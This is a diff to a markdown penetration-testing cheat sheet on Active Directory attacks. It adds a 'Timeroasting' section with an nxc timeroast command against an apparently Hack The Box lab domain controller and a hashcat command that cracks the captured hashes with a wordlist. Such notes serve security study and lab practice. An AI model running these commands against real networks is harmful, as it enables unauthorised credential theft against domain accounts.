@@ -124,6 +124,13 @@ Reference: [Identify SPN accounts, request TGS tickets, and crack offline](https
 
 ---
 
+## 18. Timeroasting
+```powershell
+nxc smb dc.rustykey.htb -k -M timeroast
+
+hashcat -m 31300 time_hashes /usr/share/wordlists/rockyou.txt
+```
+
 ## 18. NTLM Relaying
 
 Reference: [NTLM Relay Attack](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTLM%20Attacks.md)
